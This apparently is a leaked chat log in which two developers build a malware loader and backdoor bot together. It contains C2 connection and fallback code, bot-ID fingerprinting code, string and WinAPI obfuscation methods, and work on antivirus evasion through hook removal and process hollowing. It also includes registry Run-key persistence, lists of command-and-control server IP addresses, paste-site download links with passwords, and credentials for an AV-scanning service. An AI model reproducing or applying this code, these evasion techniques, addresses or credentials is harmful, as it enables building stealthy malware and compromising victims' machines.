+One attempt, connected to one address. Went through all the addresses in all the lists, fell asleep. You go through all the addresses in all the lists again, only now you fall asleep for 30 minutes between lists.
+
+2020-07-10T09:35:17 mushroom -> frog
+It didn't work again, shutdown.
+
+2020-07-10T09:35:54 mushroom -> frog
+3 attempts to send a request, failed, reconnect, go through the lists again, as I wrote above.
+
+2020-07-10T09:36:46 mushroom -> frog
+Only code 200 is successful, everything else is not considered successful, then you make two more attempts, not successful and five reconnect.
+
+2020-07-10T09:39:33 mushroom -> frog
+I'll send you an example of string obfuscation and WinApi calls. You can just paste it in there. You've got it all done you can tell. It's time to put your kit to work, Booza said. Finish the rough edges that remain.
+
+2020-07-10T09:42:31 mushroom -> frog
+Download: https://qaz.im/load/6YnkTy/a8rKD7
+Delete: https://qaz.im/index.php?a=delete&q=70564758
+Password: 6#qspX.rR8@1-Y8$S
+
+2020-07-10T09:43:51 mushroom -> frog
+Obfuscate string _STR("Ansi string"), WCHAR[] wstr; lstrcpyW(wstr, L "Unicode"); use wstr then where you need Unicode.
+
+2020-07-10T09:44:42 mushroom -> frog
+Obfuscation of strings is enabled by macro OBFUSCATED_STRINGS, it should be enabled in Release_nologs.
+
+2020-07-10T09:46:44 mushroom -> frog
+WinApi obfuscation is pretty self-explanatory there. Global variables kernel32, etc. are wrapper class objects over WinApi libraries, they have loading and getting address of WinApi function, and its call is on the fly, so there is no trace of these functions in the binary file.
+
+2020-07-10T09:48:24 mushroom -> frog
+You add a winapiproxy.h header and use kernel32 objects, etc. For example kernel32.getTempPath, wininet.internetOpen, wininet.internetClose.
+
+2020-07-10T09:49:08 mushroom -> frog
+Adding new functions for obfuscation do the same as there, just as a class method, not hard there.
+
+2020-07-10T09:49:56 mushroom -> frog
+Replace all your static strings with _STR("string")\_WCS("String")\_TSTR("String").
+
+2020-07-10T09:50:34 mushroom -> frog
+_TSTR turns into _STR if no UNICODE macro is specified, and into _WCS if it is, for convenience.
+
+2020-07-10T09:52:05 mushroom -> frog
+Then check the import of the resulting file, and the lines in it. There shouldn't be any. A handy utility to view the exe file http://www.mitec.cz/exe.html if needed.
+
+2020-07-10T09:52:58 mushroom -> frog
+You got it. Write, I'll give you login/password to dyncheck, there you can check for antiviruses.
+
+2020-07-10T09:55:19 frog -> mushroom
+And in GetApi.h, how can you add functions that aren't there?
+
+2020-07-10T09:58:40 mushroom -> frog
+There's more writing in there:
+HMODULE lib = LoadLibrary("...");
+typedef void(WINAPI* functype)(void)
+functype ptr = (functype)GetProcAddress(lib, "func");
+ptr()
+
+2020-07-10T09:59:13 mushroom -> frog
+The one I sent you has already done this for a large number of functions.
+
+2020-07-10T10:00:22 mushroom -> frog
+Here's how I make a connection to the server:
+bool Commander::connect()
+{
+    if (addressListConnect())
+        return true;
+
+    if (emercoinListConnect())
+        return true;
+
+    if (dateListConnect())
+        return true;
+
+    debug_printf(TEXT("Sleep %u msecs\n"), TRY_CONNECT_INTERVAL);
+    kernel32.sleep(TRY_CONNECT_INTERVAL);
+
+    if (addressListConnect())
+        return true;
+
+    debug_printf(TEXT("Sleep %u msecs\n"), TRY_LIST_CONNECT_INTERVAL);
+    kernel32.sleep(TRY_LIST_CONNECT_INTERVAL);
+
+    if (emercoinListConnect())
+        return true;
+
+    debug_printf(TEXT("Sleep %u msecs\n"), TRY_LIST_CONNECT_INTERVAL);
+    kernel32.sleep(TRY_LIST_CONNECT_INTERVAL);
+
+    if (dateListConnect())
+        return true;
+
+    return false;
+}
+
+2020-07-10T10:01:06 mushroom -> frog
+Went through all the lists, did not work, fell asleep, again on all the lists, but between lists of 30 minutes interval. Did not pass completion.
+
+2020-07-10T10:03:25 mushroom -> frog
+TRY_CONNECT_INTERVAL - 5 min, TRY_LIST_CONNECT_INTERVAL 30 min.
+
+2020-07-10T12:03:37 frog -> mushroom
+Just wanted to clarify:
+If it so happens that the domain name and computer name are the same on the two computers, then the id will be the same.
+I also put in the id the date the Windows folder was created, but this date may also be the same on different machines.  What to do in this case?
+
+2020-07-10T12:04:46 mushroom -> frog
+Use a creation date accurate to 1msec to avoid this as much as possible.
+
+2020-07-10T12:05:40 mushroom -> frog
+Then the probability that everything will match will tend to zero.
+
+2020-07-10T12:08:37 mushroom -> frog
+As an example:
+TCHAR sysPath[MAX_PATH + 1];
+    if (!kernel32.getSystemWindowsDirectory(sysPath, MAX_PATH + 1))
+    {
+        debug_printf(TEXT("Can't get system windows directory, error: %u\n"), GetLastError())
+        *size = 0;
+        return FALSE;
+    }
+
+    HANDLE sysFolder = kernel32.createFile(sysPath, GENERIC_READ, FILE_SHARE_READ, NULL,
+        OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+    if (sysFolder == INVALID_HANDLE_VALUE)
+    {
+        debug_printf(TEXT("Can't open system windows directory, error: %u\n"), GetLastError());
+        *size = 0;
+        return FALSE;
+    }
+
+    FILETIME sysFolderFileTime = { 0 };
+    if (!kernel32.getFileTime(sysFolder, &sysFolderFileTime, NULL, NULL))
+    {
+        debug_printf(TEXT("Can't get system windows directory file time, error: %u\n"),
+            GetLastError());
+        kernel32.closeHandle(sysFolder;)
+        *size = 0;
+        return FALSE;
+    }
+    kernel32.closeHandle(sysFolder);
+
+    SYSTEMTIME sysFolderSystemTime = { 0 };
+    if (!kernel32.fileTimeToSystemTime(&sysFolderFileTime, &sysFolderSystemTime))
+    {
+        debug_printf(
+            TEXT("Can't convert system windows directory file time to system time, error: %u\n"),
+            GetLastError());
+        *size = 0;
+        return FALSE;
+    }
+
+    TCHAR creationDateStr[19];
+    wsprintf(creationDateStr, _TSTR(TEXT("%u%u%u%u%u%u")), sysFolderSystemTime.wMonth,
+        sysFolderSystemTime.wDay, sysFolderSystemTime.wYear, sysFolderSystemTime.wHour,
+        sysFolderSystemTime.wMinute, sysFolderSystemTime.wSecond,
+        sysFolderSystemTime.wMilliseconds);
+
+2020-07-10T12:10:46 frog -> mushroom
+I read somewhere that this date is fixed when you build the OS, not when you install it (for some versions of Windows). I, for example, have a Windows folder creation date of "July 14, 2009" even though it's actually installed much later.
+
+2020-07-10T12:13:10 mushroom -> frog
+Check. What you get, you can take the date of creation or the date of the last change.
+
+2020-07-10T12:13:25 mushroom -> frog
+My creation date is normal.
+
+2020-07-10T12:14:15 mushroom -> frog
+getFileTime(sysFolder, &sysFolderFileTime, NULL, NULL) here you can take where NULL the date of last change, etc.
+
+2020-07-10T12:37:10 mushroom -> frog
+For now, leave the creation date with great accuracy, as long as there were no bot id screwups. We'll have to clarify when this date is set.
+
+2020-07-10T15:20:05 frog -> mushroom
+If a command is requested from one ip-address and the connection to this ip-address is lost, then the response can be sent to another ip-address (which we will find on the lists) or not? Not quite clear, is the admin common to all ip-addresses or not?
+
+2020-07-10T15:20:38 mushroom -> frog
+Yes. Common to all addresses.
+
+2020-07-10T15:21:37 mushroom -> frog
+Command requested, received, send the result error 3 times, reconnect, where you managed to connect there and send the result.
+
+2020-07-10T15:22:20 frog -> mushroom
+Got it.
+The TOR says the get_possible_domain function needs to be obfuscated. Need to confuse it, complicate it?
+
+2020-07-10T15:23:42 mushroom -> frog
+Yes, you can confuse it. Also, obfuscate WinApi function calls in it. I just obfuscate WinApi function calls in it. You can cram some extra calculations into it.
+
+2020-07-10T15:28:49 frog -> mushroom
+And how does GetApi.h calculate the cache - 2 parameter (e.g. 0xC8AC8026)?
+#define pCustomFunc pushargEx< DLL_KERNEL32, 0xC8AC8026, 1 >
+The third one, it seems to be an index in the table. I still don't understand the second one.
+
+2020-07-10T15:31:36 mushroom -> frog
+I don't know, I haven't figured it out. Just used it, and then wrote my own Winapiproxy, GetApi can crash on different versions of Windows, because there addresses of functions it uses are different in different versions of windows.
+
+2020-07-10T15:32:05 mushroom -> frog
+That's why I stopped using it, because of the inconvenience.
+
+2020-07-10T15:33:03 mushroom -> frog
+I think the second parameter is the address of the function in the library.
+
+2020-07-10T15:33:53 frog -> mushroom
+Need to remove all (or part of) the lib file connections to reduce the size of the executable?
+
+2020-07-10T15:34:46 mushroom -> frog
+Winapi remove everything except simple functions of working with strings, memory allocation, memory release.
+
+2020-07-10T15:35:31 mushroom -> frog
+The size will be smaller the less you use the standard library.
+
+2020-07-10T15:36:16 mushroom -> frog
+We need to hide traces of WinApi functions in the binary file, that's why we make obfuscation of WinApi functions.
+
+2020-07-10T15:36:54 mushroom -> frog
+And strings, too, so that for example server addresses are not openly visible in the binary.
+
+2020-07-10T15:42:56 frog -> mushroom
+If local date differs from server date (by a day) because time zones are different, should it be taken into account?
+I.e. somewhere it is already a new day (on the server, for example), but not on the client yet.
+
+2020-07-10T15:43:23 mushroom -> frog
+Not different, using UTC time.
+
+2020-07-10T15:43:48 mushroom -> frog
+In universal format.
+
+2020-07-10T15:44:36 mushroom -> frog
+Don't use a local date.
+
+2020-07-10T15:45:51 mushroom -> frog
+SYSTEMTIME sysTime = { 0 };
+    kernel32.getSystemTime(&sysTime);
+
+2020-07-10T15:48:02 mushroom -> frog
+If there is no match theoretically because of seconds, for example, it will still take several hours to connect by list.
+
+2020-07-10T15:48:24 mushroom -> frog
+Especially the last one, which is generated based on the date.
+
+2020-07-10T15:48:46 mushroom -> frog
+On the second pass of the lists then the date will match.
+
+2020-07-10T15:50:11 frog -> mushroom
+The third list takes a very long time to check. The TOR says to try to make 5000 connections. Is this normal?
+
+2020-07-10T15:50:23 mushroom -> frog
+Yes.
+
+2020-07-10T15:52:47 mushroom -> frog
+5,000 emercoin addresses that are generated based on the date.
+
+2020-07-10T15:56:39 frog -> mushroom
+The TOR says that the time to find a server is given 3 hours. During this time, probably not 5000 addresses to search. Or you can search longer, like in the example above.
+
+2020-07-10T16:00:16 mushroom -> frog
+How do you get to 5000 addresses?
+
+2020-07-10T16:00:32 mushroom -> frog
+I estimate 5000 is less than 3 hours.
+
+2020-07-10T16:04:42 frog -> mushroom
+I have about 500 in 3 hours right now that I have time to check. That's probably because I use 2 methods. The resolve_emercoin library function takes longer to check the emercoin address.
+
+2020-07-10T16:06:41 mushroom -> frog
+Go through 5000 at a time, as it will go, if you need to then just reduce the number, until 5000 at a time.
+
+2020-07-10T16:11:37 mushroom -> frog
+I'm off for now.
+
+2020-07-10T16:11:54 frog -> mushroom
+Bye
+
+2020-07-13T11:38:47 frog -> mushroom
+Hi!
+During process masking, when you call ResumeThread, Kaspersky antivirus gets scolded. And when you run an exe file from the temp folder, it doesn't like it either. What to do with it?
+I've tried to obfuscate system calls as much as possible, but in debugger I see some strange WinApi calls somewhere in prologue and epilogue. Is there any way to remove them?
+I uploaded the latest changes to github.
+
+2020-07-13T11:41:42 mushroom -> frog
+Hi. No you can't remove yours. In the import by exe what is there?
+
+2020-07-13T11:41:51 mushroom -> frog
+What functions?
+
+2020-07-13T11:42:12 mushroom -> frog
+What are the lines in the binary?
+
+2020-07-13T11:42:30 mushroom -> frog
+What does antivirus say, what does it call your threat?
+
+2020-07-13T11:45:07 frog -> mushroom
+Address Type P Symbol (undecorated)
+000000013F0CA5DC Export 0 OptionalHeader.AddressOfEntryPoint
+000000013F0CC000 Import GetProcAddress
+000000013F0CC008 Import GetModuleHandleW
+000000013F0CC010 Import RtlCompareMemory
+000000013F0CC018 Import K32EnumProcesses
+000000013F0CC020 Import GetSystemTimeAsFileTime
+000000013F0CC028 Import SetUnhandledExceptionFilter
+000000013F0CC030 Import GetCurrentProcess
+000000013F0CC038 Import TerminateProcess
+000000013F0CC040 Import IsProcessorFeaturePresent
+000000013F0CC048 Import CloseHandle
+000000013F0CC050 Import InitializeSListHead
+000000013F0CC058 Import GetCurrentThreadId
+000000013F0CC060 Import GetCurrentProcessId
+000000013F0CC068 Import QueryPerformanceCounter
+000000013F0CC070 Import GetStartupInfoW
+000000013F0CC078 Import IsDebuggerPresent
+000000013F0CC080 Import CreateEventW
+000000013F0CC088 Import WaitForSingleObjectEx
+000000013F0CC090 Import ResetEvent
+000000013F0CC098 Import SetEvent
+000000013F0CC0A0 Import DeleteCriticalSection
+000000013F0CC0A8 Import InitializeCriticalSectionAndSpinCount
+000000013F0CC0B0 Import LeaveCriticalSection
+000000013F0CC0B8 Import EnterCriticalSection
+000000013F0CC0C0 Import UnhandledExceptionFilter
+000000013F0CC118 Import inet_ntop
+000000013F0CC120 Import Ordinal17
+000000013F0CC128 Import Ordinal15
+000000013F0CC130 Import Ordinal23
+000000013F0CC138 Import Ordinal20
+000000013F0CC140 Import Ordinal22
+000000013F0CC148 Import Ordinal18
+000000013F0CC150 Import Ordinal3
+000000013F0CC158 Import Ordinal9
+000000013F0CC160 Import Ordinal57
+000000013F0CC168 Import inet_pton
+000000013F0CC170 Import Ordinal151
+000000013F0CC268 Import RtlVirtualUnwind
+000000013F0CC270 Import RtlLookupFunctionEntry
+000000013F0CC278 Import RtlCaptureContext
+000000013F0CC108 Import __CxxFrameHandler4
+000000013F0CC0D0 Import __current_exception
+000000013F0CC0D8 Import __C_specific_handler
+000000013F0CC0E0 Import memset
+000000013F0CC0E8 Import __std_terminate
+000000013F0CC0F0 Import __current_exception_context
+000000013F0CC0F8 Import memcpy
+000000013F0CC250 Import _set_fmode
+000000013F0CC258 Import __p__commode
+000000013F0CC180 Import atoi
+000000013F0CC1C8 Import _c_exit
+000000013F0CC1D0 Import _register_thread_local_exe_atexit_callback
+000000013F0CC1D8 Import _initterm
+000000013F0CC1E0 Import _exit
+000000013F0CC1E8 Import _configure_narrow_argv
+000000013F0CC1F0 Import exit
+000000013F0CC1F8 Import _initialize_narrow_environment
+000000013F0CC200 Import _set_app_type
+000000013F0CC208 Import _initialize_onexit_table
+000000013F0CC210 Import _seh_filter_exe
+000000013F0CC218 Import _get_narrow_winmain_command_line
+000000013F0CC220 Import _initterm_e
+000000013F0CC228 Import _initterm_e
+000000013F0CC230 Import _cexit
+000000013F0CC238 Import _register_onexit_function
+000000013F0CC240 Import _crt_atexit
+000000013F0CC190 Import _set_new_mode
+000000013F0CC198 Import free
+000000013F0CC1B8 Import __setusermatherr
+000000013F0CC1A8 Import _configthreadlocale
+
+2020-07-13T11:46:04 frog -> mushroom
+And strings:
+Address Disassembled code String
+000000013F0CA108 lea rcx,qword ptr ds:[13F0CC3A0] L "api-ms-win-core-synch-l1-2-0.dll"
+000000013F0CA11D lea rcx,qword ptr ds:[13F0CC478] L "kernel32.dll"
+000000013F0CA132 lea rdx,qword ptr ds:[13F0CC3E8] "SleepConditionVariableCS"
+000000013F0CA142 lea rdx,qword ptr ds:[13F0CC408] "WakeAllConditionVariable"
+000000013F0CA649 or qword ptr ds:[13F0D0020],FFFFFFFFFFFFFFF "/ "
+
+2020-07-13T11:49:41 frog -> mushroom
+The antivirus engine reports:
+PDM:Exploit.Win32.Generic.nblk
+or
+PDM:Exploit.Win32.Generic.
+
+2020-07-13T11:49:44 mushroom -> frog
+I forgot to give you the login password for dyncheck. There you will check, so far only for statics.
+
+2020-07-13T11:50:11 mushroom -> frog
+dyncheck.com
+graddds@xmpp.jp
+49gjI9gfdpgj49gpjoJKGLFDg23
+
+2020-07-13T11:51:05 mushroom -> frog
+There check release_nologs 32\64 bit.
+
+2020-07-13T11:51:20 mushroom -> frog
+Write down how many detects and what they write.
+
+2020-07-13T11:52:21 mushroom -> frog
+Check for static, windows defender cloud should be off and so should the internet. It's always on by default.
+
+2020-07-13T12:02:14 mushroom -> frog
+I forgot to tell you to go to dyncheck via vpn or tor.
+
+2020-07-13T12:03:07 frog -> mushroom
+I used tor to go in.
+For x86 version the results of dyncheck are as follows:
+Vba32 AntiVirus Personal | infected BScope.Trojan.Meterpreter
+Windows Defender | VirTool:Win32/Obfuscator.QV
+
+2020-07-13T12:03:29 mushroom -> frog
+Did you obfuscate GetApi.h?
+
+2020-07-13T12:03:49 mushroom -> frog
+It could be because of him.
+
+2020-07-13T12:04:00 mushroom -> frog
+It's happened before.
+
+2020-07-13T12:04:56 mushroom -> frog
+I see in the code you use GetApi.h for obfuscation. Right?
+
+2020-07-13T12:05:07 frog -> mushroom
+yes
+
+2020-07-13T12:05:24 mushroom -> frog
+Try replacing it with the one I gave you.
+
+2020-07-13T12:05:42 mushroom -> frog
+There is no VirTool:Win32/Obfuscator.QV on it yet.
+
+2020-07-13T12:06:09 mushroom -> frog
+Then let me know what you get.
+
+2020-07-13T12:07:26 mushroom -> frog
+I'm off.
+
+2020-07-13T12:29:35 mushroom -> frog
+Found Ws2_32.dll function inet_ntop, inet_pton in import. We need to remove it.
+
+2020-07-13T12:30:39 mushroom -> frog
+They must be from resolve_emercoin
+
+2020-07-13T12:33:42 mushroom -> frog
+Download: https://qaz.im/load/d47bkf/t6te4d
+Delete: https://qaz.im/index.php?a=delete&q=925966803
+Password: ]4so's&WSpxHK04a`
+
+2020-07-13T12:35:13 mushroom -> frog
+You can do it this way. Separately, because the header winsock2.h must always go before windows.h, and this is difficult to achieve, because of this will be build errors. For this reason it is done as a separate file, so as not to mix.
+
+2020-07-13T12:42:51 mushroom -> frog
+I don't seem to find any suspicious strings. My x86 was immediately spotted by Defender, x64 was not. Writes about obfuscation, most likely this one is stolen.
+
+2020-07-13T12:43:09 mushroom -> frog
+How you replace the obfuscation you will tell me.
+
+2020-07-13T12:43:36 mushroom -> frog
+And take Ws2_32 out of the import as much as possible.
+
+2020-07-13T12:49:46 frog -> mushroom
+I'll also try to find the cause in GetApi.
+
+2020-07-13T13:05:10 mushroom -> frog
+There's probably an algorithm in there for how it works.
+
+2020-07-13T13:06:12 mushroom -> frog
+Don't drag it out. If it doesn't work with GetApi.h, replace it.
+
+2020-07-13T15:36:26 frog -> mushroom
+Do you need to dyncheck.com dyncheck?
+
+2020-07-13T15:42:45 mushroom -> frog
+Not yet. Static shows what?
+
+2020-07-13T15:42:58 mushroom -> frog
+All clear?
+
+2020-07-13T15:43:42 frog -> mushroom
+Clear. Tweaked the GetApi.
+
+2020-07-13T15:44:38 mushroom -> frog
+If everything is pure for x86\x64. Then the dynamic check should be done in full set. That is, run the loader in this check.
+
+2020-07-13T15:44:58 mushroom -> frog
+Is the bootloader completely clean too?
+
+2020-07-13T15:45:07 mushroom -> frog
+And obfuscated?
+
+2020-07-13T15:47:13 frog -> mushroom
+No. The uploader is not ready yet. Haven't had time to do the anchoring yet.
+I do not really understand how to do the fixing. In that article, a lot of them described, which one to take, have not yet figured out.
+
+2020-07-13T15:47:52 mushroom -> frog
+Take the easiest for you, stupidly on autorun in the registry let it be added for now.
+
+2020-07-13T15:47:57 mushroom -> frog
+Loader.
+
+2020-07-13T15:48:28 mushroom -> frog
+Finish the loader then, obfuscate it following the bot's example.
+
+2020-07-13T15:48:48 mushroom -> frog
+We need the whole kit (loader + bot).
+
+2020-07-13T15:48:57 mushroom -> frog
+To give to the tester.
+
+2020-07-13T15:53:27 frog -> mushroom
+What about Kaspersky? So it doesn't react? In processhollowing it reacts to ResumeThread. Tried ResumeThread in different ways, doesn't help.
+
+2020-07-13T15:54:09 mushroom -> frog
+ResumeThread obfuscated?
+
+2020-07-13T15:54:36 mushroom -> frog
+Is that in processhollowing or in doppelgaging?
+
+2020-07-13T15:54:36 mushroom -> frog
+Is that in processhollowing or in doppelgaging?
+
+2020-07-13T15:55:12 frog -> mushroom
+Sure. in processhollowing. libproxy used
+
+2020-07-13T15:56:02 mushroom -> frog
+I'll check it out. Tomorrow. In the meantime, finish the loader.
+
+2020-07-14T12:50:43 frog -> mushroom
+Hi.
+What is the correct way to find out the date on the server?
+I've always done this: HttpQueryInfoA(hHttpRequest, HTTP_QUERY_DATE, date, &bufferSize, &index);
+I also tried this: HttpQueryInfo(hHttpRequest, HTTP_QUERY_RAW_HEADERS_CRLF, cookiesBuffer, &cookiesBufferSize, &index);
+But sometimes we get different date strings.
+And the date format must be converted?  Because now, for example, query returns result "Tue, 14 Jul 2020 12:47:34 GMT".
+The format was different before (2020-07-14).
+
+2020-07-14T12:56:11 mushroom -> frog
+Hi. You don't need to do it in any way. Just a GET /<id>/4 request in the headers should return the date.
+
+2020-07-14T12:56:28 mushroom -> frog
+It's for the bot.
+
+2020-07-14T12:59:08 mushroom -> frog
+For the loader query to get the version, there will be a date in the headers too.
+
+2020-07-14T13:03:59 frog -> mushroom
+Here? Only here the time (on the test server) instead of the date (Date field).
+This is the result of a HEAD request:
+"HTTP/1.1 200 OK\r\nServer: nginx/1.10.3 (Ubuntu)\r\nContent-Type: text/html; charset=UTF-8\r\nConnection: keep-alive\r\nDate: 12:59:53\r\nX-Tag: v1.0\r\n\r\n"
+
+2020-07-14T13:04:29 mushroom -> frog
+Check it out on the battlefield.
+
+2020-07-14T13:04:42 mushroom -> frog
+There is no signature on the test one.
+
+2020-07-14T13:06:26 frog -> mushroom
+Was still dealing with Process Hollowing x86. Turned out that antivirus reacts as soon as there is an attempt to write something (WriteProcessMemory) to the PebImage Base Address. Even if I change one byte there, it reacts. Everything is obfuscated.
+
+2020-07-14T13:08:05 mushroom -> frog
+m_module = m_kernel32.loadLibrary(fileName);
+removeHooks(m_module);
+
+2020-07-14T13:08:25 mushroom -> frog
+it is in the file libraryproxy.cpp
+
+2020-07-14T13:08:54 mushroom -> frog
+Look this function removes just the traps that anti-viruses put on suspicious functions.
+
+2020-07-14T13:09:52 mushroom -> frog
+Consequently, the function must then be taken and called from m_module. In libraryproxy everything is already done for this.
+
+2020-07-14T13:11:53 mushroom -> frog
+Remove traps from all WinApi libraries you use this way.
+
+2020-07-14T13:16:57 frog -> mushroom
+Process Hollowing all obfuscated with libraryproxy.
+I'll check it again. Missed some functions that call removeHooks: Rva2Offset, isForwardedFunc. I had to compile them from the Internet and from old AntiHooks.cpp, maybe that's why something doesn't work.
+
+2020-07-14T13:17:57 mushroom -> frog
+I'll send you what's missing.
+
+2020-07-14T13:20:10 mushroom -> frog
+Download: https://qaz.im/load/HEFdrH/SRfi4k
+Delete: https://qaz.im/index.php?a=delete&q=1486018534
+Password: g48CLBJb\sm=;GI0x
+
+2020-07-14T13:52:57 frog -> mushroom
+It's not working yet. I'll also try to put Process Hollowing in a separate project and run something with it.
+How do I run the bot from the loader? The TOR says you don't have to save the bot to disk. Does this mean using the same Process Hollowing?
+
+2020-07-14T13:53:20 mushroom -> frog
+Yes.
+
+2020-07-14T13:59:42 mushroom -> frog
+This is how I have the process hollowing done:
+Download: https://qaz.im/load/zR8ThN/Rbsrze
+Delete: https://qaz.im/index.php?a=delete&q=2013528276
+Password: p!N(7m%\@1PPm&fmE
+
+2020-07-14T14:00:14 mushroom -> frog
+If needed.
+
+2020-07-15T12:57:25 frog -> mushroom
+Hi!
+Figured out Process hollowing x86. It took me a long time to find the cause, but I found it. Now Kaspersky antivirus is silent. Checked on Windows 10, also silent. I have obfuscated all calls of ws2_32. I downloaded the latest version of backdoor from github.
+There is something I would like to clarify. Sometimes rundll.exe launches rundll.exe*32 and I can't track the moment when the second exe-file (rundll.exe*32) finishes, so that I can delete the dll-file in time.
+Where is the boot loader file better hidden at startup? In the Windows folder?
+
+2020-07-15T12:57:51 frog -> mushroom
+I'm making a loader right now.
+
+2020-07-15T13:01:12 mushroom -> frog
+In temp or appdata. This is the responsibility of the other person who makes the crypt. This is the kind of program that your program will be inside. He pulls it out and runs it. So you just have to worry about where to load the new version of the loader, in temp or appdata is best.
+
+2020-07-15T13:02:09 mushroom -> frog
+Sometimes rundll.exe runs rundll.exe*32 and I can't keep track of when the second exe file (rundll.exe*32) finishes in time to delete the dll file. Explain this more precisely.
+
+2020-07-15T13:06:04 mushroom -> frog
+You create a process, you have its descriptor and ProcessInformation. You can wait for WaitForSingleObject to complete them. Remembered the dll file name. Wait for the process to complete, delete it. This is only if the process has a timeout, if it's 0, we're not interested in its fate, and neither is the fate of the file.
+
+2020-07-15T13:21:20 frog -> mushroom
+Should I attach the file that I copy to the temp or appdata folder?
+Regarding rundll, I will now try to reproduce this error
+
+2020-07-15T13:22:06 mushroom -> frog
+Fix it yourself. Get your program name and use it.
+
+2020-07-15T13:22:36 mushroom -> frog
+The program should fix itself.
+
+2020-07-15T13:22:48 frog -> mushroom
+I think I got it
+
+2020-07-15T13:24:39 mushroom -> frog
+WCHAR filename[MAX_PATH + 1];
+    if (kernel32.getModuleFileNameW(NULL, filename, _countof(filename))
+
+2020-07-15T13:24:52 mushroom -> frog
+That's how you get the file name of your program.
+
+2020-07-15T13:25:26 mushroom -> frog
+Or you can getModuleFileNameA for ANSI encoding.
+
+2020-07-15T13:37:33 frog -> mushroom
+Okay. Thank you.
+Is there any way to remove VCRUNTIME140_1.dll calls from the 64-bit Release version?
+
+2020-07-15T13:39:49 mushroom -> frog
+That's something you used from the standard library. You can delete it if you don't use it.
+
+2020-07-15T13:40:07 mushroom -> frog
+string used exactly.
+
+2020-07-15T13:40:20 mushroom -> frog
+Link statically.
+
+2020-07-15T13:40:46 mushroom -> frog
+To work everywhere, and wherever vcredist is not installed.
+
+2020-07-15T14:29:56 frog -> mushroom
+The string is self-written. Made static layout (/MT), 64-bit files started to run.
+Dealt with rundll.exe. There was another error: deleting file earlier than needed. But this error made me ask a question: if the process is started with a zero timeout, do I still have to wait in a separate thread for it to finish and delete the file?
+
+2020-07-15T14:30:44 mushroom -> frog
+No. If the timeout is 0 the file and the process are not of interest to us.
+
+2020-07-15T14:31:27 mushroom -> frog
+All done?
+
+2020-07-15T14:32:01 mushroom -> frog
+Commit everything (loader and bot).
+
+2020-07-15T14:34:34 frog -> mushroom
+I'm still working on the loader.
+
+2020-07-15T14:35:53 mushroom -> frog
+Commit then. To start the downloader, it latched on and downloaded and started the bot. And after reloading it launched downloaded and started the bot.
+
+2020-07-15T14:36:48 frog -> mushroom
+Okay
+
+2020-07-16T06:49:39 frog -> mushroom
+Uploaded the latest versions of both projects to gitlab. I didn't have time to check the uploader, because there was no working server available, and the files stopped being downloaded from the test server. I will try later.
+
+2020-07-16T07:08:28 frog -> mushroom
+Uploaded the latest versions of both projects to gitlab. I didn't have time to check the uploader, because there was no working server available, and the files stopped being downloaded from the test server. I will try later.
+
+2020-07-16T08:36:46 mushroom -> frog
+About the addresses. They change frequently.
+
+2020-07-16T08:36:55 mushroom -> frog
+Here are the workers for you at the moment.
+
+2020-07-16T08:37:17 mushroom -> frog
+Загрузчик: https://185.99.2.49:443,https://78.108.216.13:443,https://217.12.209.44:443,https://185.99.2.191:443,https://80.82.68.132:443,https://62.108.35.215:443
+
+2020-07-16T08:37:58 mushroom -> frog
+Бэкдор: https://45.148.120.142:443,https://80.82.68.32:443,https://185.14.31.135:443,https://194.87.145.86:443,https://85.204.116.188:443,https://185.164.32.148:443
+
+2020-07-16T08:38:22 mushroom -> frog
+Check the bootloader and bot kit on them.
+
+2020-07-16T08:57:26 mushroom -> frog
+Write me as soon as you check it out.
+
+2020-07-16T14:59:11 mushroom -> frog
+Regarding the kit check. Run the loader and all the commands through the bot, using the admin. Then reboot your computer, start the bootloader itself, and once again run all the commands through the bot.
+
+2020-07-16T14:59:26 mushroom -> frog
+If everything goes smoothly. Email me.
+
+2020-07-16T14:59:52 frog -> mushroom
+Okay
+
+2020-07-16T15:00:29 mushroom -> frog
+This is with and without logs check.
+
+2020-07-16T15:24:40 mushroom -> frog
+What file do you have the server addresses in?
+
+2020-07-16T15:24:54 mushroom -> frog
+On GitlAb the old ones are now.
+
+2020-07-16T15:25:10 frog -> mushroom
+config.h
+
+2020-07-16T15:37:01 frog -> mushroom
+Download files from the same addresses: "/api/v130"? Trying to download a file, I get the string "null". Although I downloaded all the files on the server
+
+2020-07-16T15:39:08 mushroom -> frog
+Yes with these. There you have to click the checkmark button, it's next to the gear, "To production" pops up on it.
+
+2020-07-16T15:39:24 frog -> mushroom
+Got it, thanks!
+
+2020-07-16T15:40:07 mushroom -> frog
+If you have problems with loading and nothing has changed, ask Talar, he does the server part.
+
+2020-07-16T15:55:48 frog -> mushroom
+When I save the exe file to the App Data folder, Kaspersky reacts. How to deal with it?
+
+2020-07-16T15:56:06 mushroom -> frog
+What exe file?
+
+2020-07-16T15:56:20 mushroom -> frog
+For a command to run a file?
+
+2020-07-16T15:56:29 frog -> mushroom
+of the loader
+
+2020-07-16T15:56:37 mushroom -> frog
+When updating?
+
+2020-07-16T15:57:17 frog -> mushroom
+Yes, if the versions do not match, I download and save the loader file there
+
+2020-07-16T15:57:25 mushroom -> frog
+Try it in Temp. If it doesn't go through, scan it for dyncheck.
+
+2020-07-16T15:57:43 mushroom -> frog
+And also find a place that sticks and change it.
+
+2020-07-16T15:57:50 mushroom -> frog
+Like you did with the bot.
+
+2020-07-17T12:38:51 frog -> mushroom
+Hi.
+Didn't have time to eliminate all the antivirus reactions. Everything was done, but decided to compile the live version and antivirus saw the threat again.
+There's something dangerous (for antivirus) in old resolve_emercoin.h and it reacts on get_possible_domain too. Because if it is commented out, everything is fine.
+I need more time. I will try to have it done by Monday.
+
+2020-07-17T12:39:57 frog -> mushroom
+Running in the chain "Loader -> Loader -> Bot" works fine.
+
+2020-07-17T12:41:45 frog -> mushroom
+How do I call the addAutostart function to add to autorun?
+I've added it to the registry, but I'd like to try adding it to autorun as well.
+
+2020-07-17T12:45:51 frog -> mushroom
+I also noticed that the string obfuscator works strangely.
+Example from anchorange module. This is how it works incorrectly:
+status = ADVAPI32(RegCreateKeyExW)(currUserKey, _TSTR(TEXT("Software\\\Microsoft\\Windows\\CurrentVersion\\\Run")), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &runKey, &disposition);
+And this is correct, if you copy the line:
+KERNEL32(lstrcpyW)(sub_key, _TSTR(TEXT("Software\\\Microsoft\\\Windows\\\CurrentVersion\\\Run"));
+status = ADVAPI32(RegCreateKeyExW)(currUserKey, sub_key, 0, NULL,
+REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &runKey, &disposition);
+
+2020-07-17T12:49:15 frog -> mushroom
